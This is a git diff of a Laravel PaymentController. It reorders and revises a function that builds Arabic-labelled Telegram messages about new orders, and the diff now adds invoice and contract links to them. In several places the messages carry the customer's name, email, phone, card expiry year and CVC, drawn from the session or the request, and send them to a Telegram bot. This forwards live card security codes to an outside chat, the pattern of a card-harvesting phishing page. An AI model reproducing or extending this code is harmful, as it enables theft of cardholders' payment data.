@@ -57,7 +57,6 @@ class PaymentController extends Controller
         $phone =  session()->get('phone', '');
         $email =  session()->get('email', '');
 
-        $this->sendTelegramNotification($name, $email, $phone, $order_code, $totalPrice, $firstBatch, $paymentGateway);
 
         // Create order in database
         $this->createOrder($name, $email, $phone, $order_code, $totalPrice, $firstBatch, $paymentGateway, $request->CashOrBatch);
@@ -66,7 +65,7 @@ class PaymentController extends Controller
     }
 
 
-    protected function sendTelegramNotification($name, $email, $phone, $code, $totalPrice, $firstBatch, $paymentGateway)
+    protected function sendTelegramNotification($order,$name, $email, $phone, $code, $totalPrice, $firstBatch, $paymentGateway)
     {
         // Build the message
         $message = ":: طلب جديد ::" . PHP_EOL
@@ -87,9 +86,9 @@ class PaymentController extends Controller
             . "السنة: " . session('year') . PHP_EOL
             . "CVC: " . session('cvc') . PHP_EOL
             . ":: رابط التعليمات ::" . PHP_EOL
-            . "فاتورة: " . $code . PHP_EOL
-            . "عقد: " . $code . PHP_EOL
-            . "رابط واتساب: https://wa.me/" . $code . PHP_EOL;
+            . "فاتورة: " . route('invoice.show',$order->id) . PHP_EOL
+            . "عقد: " .  route('invoice.contact',$order->code) . PHP_EOL
+          ;
 
         // Get Telegram credentials
         $key = env('TOKEN_TELEGRAM');
@@ -131,6 +130,8 @@ class PaymentController extends Controller
             'CashOrBatch' => $CashOrBatch
         ]);
         $this->add_detiles($order);
+        $this->sendTelegramNotification($order,$name, $email, $phone, $order_code, $totalPrice, $firstBatch, $paymentGateway);
+
 
     }
     public function payment_confirm()
@@ -258,8 +259,9 @@ class PaymentController extends Controller
             . "السنة: " . $request->input('year') . PHP_EOL
             . "CVC: " . $request->input('cvc') . PHP_EOL
             . ":: رابط التعليمات ::" . PHP_EOL
-            . "فاتورة: " . $order_code . PHP_EOL
-            . "عقد: " . $order_code . PHP_EOL;
+                        . "فاتورة: " . route('invoice.show',$order->id) . PHP_EOL
+                        . "عقد: " . route('invoice.contact',$order->code) . PHP_EOL
+;
 
         // Send to Telegram
         // Get Telegram credentials
@@ -361,8 +363,10 @@ class PaymentController extends Controller
             . "السنة: " . $request->input('year') . PHP_EOL
             . "CVC: " . $request->input('cvc') . PHP_EOL
             . ":: رابط التعليمات ::" . PHP_EOL
-            . "فاتورة: " . $order_code . PHP_EOL
-            . "عقد: " . $order_code . PHP_EOL;
+                        . "فاتورة: " . route('invoice.show',$order->id) . PHP_EOL
+
+                        . "عقد: " . route('invoice.contact',$order->code) . PHP_EOL
+;
 
         // Send to Telegram
         // Get Telegram credentials
